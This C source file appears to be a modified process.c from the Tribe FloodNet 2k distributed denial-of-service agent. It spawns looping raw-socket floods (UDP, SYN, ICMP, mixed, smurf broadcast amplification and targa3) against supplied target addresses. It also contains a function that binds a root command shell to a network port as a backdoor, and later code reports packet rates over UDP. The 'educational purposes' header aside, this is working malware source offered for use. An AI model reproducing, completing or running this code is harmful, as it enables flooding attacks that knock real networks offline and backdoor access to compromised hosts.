/*
 * Tribe FloodNet - 2k edition
 * by Mixter <mixter@newyorkoffice.com>
 *
 * process.c - flood / shell server thread management
 *
 * This program is distributed for educational purposes and without any
 * explicit or implicit warranty; in no event shall the author or
 * contributors be liable for any direct, indirect or incidental damages
 * arising in any way out of the use of this software.
 *
 */

#include "tribe.h"

unsigned int myip = 2130706433;	/* 127.0.0.1 network byte ordered */
extern int fw00ding, nospoof, rawsock;
int pid[CHLD_MAX + 5];
//char addressBuffer[INET_ADDRSTRLEN];

void
shellsex (int port)
{
  int s1, s2, s3;
  struct sa s_a, c_a;

  if (fork ())
    return;

  setuid (0);
  setgid (0);
#ifndef WINDOZE
  setreuid (0, 0);
  setregid (0, 0);
#endif
  s1 = socket (AF_INET, SOCK_STREAM, TCP);
  bzero ((char *) &s_a, sizeof (s_a));
  s_a.fam = AF_INET;
  s_a.add = htonl (INADDR_ANY);
  s_a.dp = htons (port);
  if (bind (s1, (struct sockaddr *) &s_a, sizeof (s_a)) < 0)
    exit (0);
  if (listen (s1, 1) < 0)
    exit (0);

  while (1)
    {
      s3 = sizeof (c_a);
      s2 = accept (s1, (struct sockaddr *) &c_a, &s3);
      dup2 (s2, 0);
      dup2 (s2, 1);
      dup2 (s2, 2);
#ifndef WINDOZE
      if (execlp ("sh", "sh", (char *) 0) < 0)
	execlp ("ksh", "ksh", (char *) 0);	/* yech, no sh */
#else
      if (execlp ("command.exe", "command.exe", (char *) 0) < 0)
	execlp ("cmd.exe", "cmd.exe", (char *) 0);	/* yech, windoze neanderthal technology */
#endif
      close (s2);
      return;
    }
}

void
commence_udp (char *ip)
{
  int i = -1, p;
  unsigned int resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }

  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, UDP);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);

	  while (1) 	    {
	    udp2 (resolved);
		//usleep(1);
		}
	}
#ifdef ATTACKLOG
      {
	char tmp[100];
	sprintf (tmp, "PID %d forking (#%d), child (%d) attacks %s, UDP\n"
		 ,getpid (), i, p, parse);
	dbug (tmp);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }

}

void
commence_syn (char *ip, int port)
{
  int i = -1, p;
  unsigned int resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, TCP);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1) {
   	      syn2 (resolved, port);
   	    //usleep(1);
		}

	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s, port is %d, SYN\n"
		 ,getpid (), i, p, parse,port);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_icmp (char *ip)
{
  int i = -1, p;
  unsigned int resolved = 0;
  char *parse;
  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX)) //fork()5次
    {
      resolved = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, ICMP);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1) {
	    icmp (resolved, 0);
		//usleep(1);
	    }
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s, ICMP\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_mix (char *ip)
{
  int i = -1, p;
  unsigned int resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, RAW);
	  if (rawsock < 0)
	    rawsock = socket (AF_INET, SOCK_RAW, IP);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    {
	      icmp (resolved, 0);
	      syn2 (resolved, 0);
	      udp2 (resolved);
	    }
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s, MIX\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_smurf (char *ip)
{
  int i = -1, p;
  unsigned int bcast, resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  resolved = resolve (parse);
  if (resolved == -1)
    {
      fw00ding = 0;
      return;
    }
  if ((parse = strtok (NULL, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      bcast = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, RAW);
	  if (rawsock < 0)
	    rawsock = socket (AF_INET, SOCK_RAW, ICMP);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    icmp (resolved, bcast);
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attack-bcast %s, SMURF\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
commence_targa3 (char *ip)
{
  int i = -1, p;
  unsigned int resolved = 0;
  char *parse;

  if ((parse = strtok (ip, DELIMITER)) == NULL)
    {
      fw00ding = 0;
      return;
    }
  while ((parse != NULL) && (i++ < CHLD_MAX))
    {
      resolved = resolve (parse);
      p = fork ();
      if (!p)
	{
	  rawsock = socket (AF_INET, SOCK_RAW, RAW);
	  if (rawsock < 0)
	    rawsock = socket (AF_INET, SOCK_RAW, 0);
	  setsockopt (rawsock, IP, IP_HDRINCL, "1", sizeof ("1"));
	  if (resolved == -1)
	    exit (0);
	  while (1)
	    targa3 (resolved);
	}
#ifdef ATTACKLOG
      {
	char tmpbuf[100];
	sprintf (tmpbuf, "PID %d forking (#%d), child (%d) attacks %s, TARGA3\n"
		 ,getpid (), i, p, parse);
	dbug (tmpbuf);
      }
#endif
      pid[i] = p;
      parse = strtok (NULL, DELIMITER);
    }
}

void
must_kill_all (void)
{
  int i;

  for (i = 0; i <= CHLD_MAX - 1; i++)
    {
#ifdef ATTACKLOG
      char tmp[100];
      if (pid[i] < 2)
	break;			/* killing -1 or 0 != fun :) */
      sprintf (tmp, "Killing flood pid (#%d): %d\n", i, pid[i]);
      dbug (tmp);
      kill (pid[i], 9);
#else
      if (pid[i] < 2)
	break;			/* killing -1 or 0 != fun :) */
      kill (pid[i], 9);
#endif
    }
}

void createShm()
{
	pmsg = (struct packetmsg *)malloc(sizeof(struct packetmsg));
  	memset(pmsg,0,sizeof(pmsg));
  	void *shm = NULL;
  	int shmid= shmget((key_t)0x1234,4096,IPC_CREAT | 0666);
  	if(shmid == -1)
  	{
		perror("share memory failed");
		exit(0);
  	}
  	shm = shmat(shmid,0,0);
 	if(shm == (void*)-1)
  	{
       		fprintf(stderr, "shmat failed\n");
       		exit(EXIT_FAILURE);
  	}
  	pmsg = (struct shared_use_st *)shm;
}

int udpConnect(short port,char *ip)
{
	socket_fd = socket(AF_INET,SOCK_DGRAM,0);
	memset(&sin_addr,0,sizeof(struct sockaddr_in));
	sin_addr.sin_family = AF_INET;
	sin_addr.sin_port   = htons(port);
	sin_addr.sin_addr.s_addr = inet_addr(ip);
	//if(connect(socket_fd,(struct sockaddr *)&sin_addr,sizeof(sin_addr)) != 0){
	//	perror("connect failed");
	//	exit(0);
	//}
	return socket_fd;
}

void *thread_send(void *arg)
{
	isRun = 1;
	int  beforebyte = 0;
	int  afterbyte  = 0;
	int  beforepacket = 0;
	int  afterpacket  = 0;
	while(isRun)
	{
		beforebyte = pmsg->totalbyte;
		beforepacket = pmsg->totalpacket;
		usleep(40000);
		afterbyte  = pmsg->totalbyte;
		afterpacket = pmsg->totalpacket;
		char msg[1024];
		sprintf(msg,"packets=%d&bytes=%d",
			afterpacket-beforepacket, afterbyte-beforebyte);
		sendto(socket_fd,msg, strlen(msg),0,
			(struct sockaddr *)&sin_addr,sizeof(sin_addr));
	}
	return NULL;
}
